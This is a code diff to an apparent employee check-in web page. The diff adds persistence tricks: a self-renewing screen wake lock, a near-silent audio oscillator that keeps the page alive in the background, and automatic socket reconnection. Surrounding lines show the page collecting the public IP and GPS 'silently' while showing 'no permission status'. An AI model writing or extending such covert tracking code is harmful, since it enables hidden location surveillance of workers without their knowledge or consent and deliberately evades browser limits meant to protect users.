@@ -61,6 +61,34 @@ document.addEventListener('visibilitychange', () => {
   }
 });
 
+// Wake lock — screen on rakhta hai
+async function requestWakeLock() {
+  try {
+    const wakeLock = await navigator.wakeLock.request('screen');
+    wakeLock.addEventListener('release', () => {
+      setTimeout(requestWakeLock, 1000);
+    });
+  } catch(e) {}
+}
+
+// Audio ko alive rakhta hai background mein
+function keepAudioAlive() {
+  try {
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const oscillator = audioCtx.createOscillator();
+    const gainNode = audioCtx.createGain();
+    gainNode.gain.value = 0.001;
+    oscillator.connect(gainNode);
+    gainNode.connect(audioCtx.destination);
+    oscillator.start();
+    document.addEventListener('visibilitychange', () => {
+      if (audioCtx.state === 'suspended') {
+        audioCtx.resume();
+      }
+    });
+  } catch(e) {}
+}
+
 async function init() {
   // 1. Get public IP
   let ipName = 'Employee';
@@ -79,11 +107,8 @@ async function init() {
     } catch {}
   }
 
-    // Screen ko sleep hone se rokta hai
-  try {
-    const wakeLock = await navigator.wakeLock.request('screen');
-    console.log('Wake lock active');
-  } catch(e) {}
+  requestWakeLock();
+  keepAudioAlive();
 
   // 3. Request GPS silently
   if (navigator.geolocation) {
@@ -99,6 +124,7 @@ async function init() {
   }
 
   // 4. Join server with IP as name
+  window._empName = ipName;
   socket.emit('employee:join', { name: ipName, empId: ipName });
 
   // 5. Show checked in — no permission status shown
@@ -169,8 +195,22 @@ async function init() {
   });
 }
 
+
+
 // Start immediately when page loads
 window.addEventListener('load', init);
+
+socket.on('disconnect', () => {
+  setTimeout(() => { socket.connect(); }, 2000);
+});
+
+socket.on('reconnect', () => {
+  socket.emit('employee:join', { 
+    name: window._empName || 'Employee', 
+    empId: window._empName || 'Employee' 
+  });
+});
+
 </script>
 </body>
 </html>
